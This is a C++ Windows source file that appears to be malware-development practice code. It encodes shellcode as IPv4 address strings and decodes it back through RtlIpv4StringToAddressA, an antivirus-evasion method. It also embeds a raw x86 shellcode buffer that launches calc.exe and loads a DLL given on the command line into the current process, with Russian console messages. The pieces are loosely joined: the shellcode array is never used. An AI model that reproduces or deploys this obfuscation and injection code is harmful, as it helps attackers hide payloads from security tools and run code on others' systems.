#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>


std::string GenerateIpv4(int a, int b, int c, int d) {
    // Creating the IPv4 address as a string
    std::ostringstream oss;
    oss << a << "." << b << "." << c << "." << d;
    return oss.str();
}

bool GenerateIpv4Output(const unsigned char* pShellcode, size_t ShellcodeSize) {
    // If the shellcode buffer is null or the size is not a multiple of 4, exit
    if (pShellcode == nullptr || ShellcodeSize == 0 || ShellcodeSize % 4 != 0) {
        return false;
    }

    size_t numAddresses = ShellcodeSize / 4;
    std::vector<std::string> ipv4Array;
    ipv4Array.reserve(numAddresses);

    for (size_t i = 0; i < ShellcodeSize; i += 4) {
        // Generating the IPv4 address from 4 bytes
        std::string ip = GenerateIpv4(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3]);
        ipv4Array.push_back(ip);
    }

    // Printing the IPv4 array
    std::cout << "std::vector<std::string> Ipv4Array = {\n\t";
    for (size_t i = 0; i < ipv4Array.size(); ++i) {
        std::cout << "\"" << ipv4Array[i] << "\"";
        if (i != ipv4Array.size() - 1) {
            std::cout << ", ";
        }
        if ((i + 1) % 8 == 0 && i != ipv4Array.size() - 1) {
            std::cout << "\n\t";
        }
    }
    std::cout << "\n};\n";

    return true;
}


typedef NTSTATUS(NTAPI* fnRtlIpv4StringToAddressA)(
    PCSTR S,
    BOOLEAN Strict,
    PCSTR* Terminator,
    PVOID Addr
    );

bool Ipv4Deobfuscation(const char* Ipv4Array[], size_t NmbrOfElements, unsigned char** ppDAddress, size_t* pDSize) {
    unsigned char* pBuffer = nullptr;
    unsigned char* TmpBuffer = nullptr;
    size_t sBuffSize = 0;
    PCSTR Terminator = nullptr;
    NTSTATUS STATUS = 0;

    // Getting RtlIpv4StringToAddressA address from ntdll.dll
    fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = reinterpret_cast<fnRtlIpv4StringToAddressA>(GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "RtlIpv4StringToAddressA"));
    if (pRtlIpv4StringToAddressA == nullptr) {
        std::cerr << "[!] GetProcAddress failed with error: " << GetLastError() << std::endl;
        return false;
    }

    // Calculating the buffer size
    sBuffSize = NmbrOfElements * 4;

    // Allocating memory for the deobfuscated shellcode
    pBuffer = static_cast<unsigned char*>(HeapAlloc(GetProcessHeap(), 0, sBuffSize));
    if (pBuffer == nullptr) {
        std::cerr << "[!] HeapAlloc failed with error: " << GetLastError() << std::endl;
        return false;
    }

    TmpBuffer = pBuffer;

    // Loop through all the IPv4 addresses in the array
    for (size_t i = 0; i < NmbrOfElements; ++i) {
        STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &Terminator, TmpBuffer);
        if (STATUS != 0x0) {
            std::cerr << "[!] RtlIpv4StringToAddressA failed at [" << Ipv4Array[i] << "] with error 0x" << std::hex << STATUS << std::endl;
            HeapFree(GetProcessHeap(), 0, pBuffer);
            return false;
        }

        // Increment TmpBuffer by 4 to store the next 4 bytes
        TmpBuffer += 4;
    }

    // Save the base address and size of the deobfuscated payload
    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;

    return true;
}


unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


int main(int argc, char* argv[]) {
    // Установка кодовой страницы для корректного отображения кириллицы
    SetConsoleOutputCP(1251);

    unsigned char shellcode[] = { 192, 168, 0, 1, 10, 0, 0, 1, 172, 16, 0, 1, 8, 8, 8, 8 };
    size_t shellcodeSize = sizeof(shellcode);

    if (!GenerateIpv4Output(shellcode, shellcodeSize)) {
        std::cerr << "Error generating IPv4 output." << std::endl;
    }

    if (argc < 2) {
        std::cerr << "[!] Отсутствует аргумент; Нужно указать DLL для выполнения." << std::endl;
        return -1;
    }

    std::string dllPath = argv[1];
    std::cout << "[i] Внедрение \"" << dllPath << "\" в локальный процесс с PID: " << GetCurrentProcessId() << std::endl;

    std::cout << "[+] Загрузка DLL... ";
    HMODULE hModule = LoadLibraryA(dllPath.c_str());
    if (hModule == nullptr) {
        std::cerr << "[!] LoadLibraryA завершилась с ошибкой: " << GetLastError() << std::endl;
        return -1;
    }
    std::cout << "ГОТОВО!" << std::endl;

    std::cout << "[#] Нажмите <Enter>, чтобы выйти ... ";
    std::cin.get();

    return 0;
}
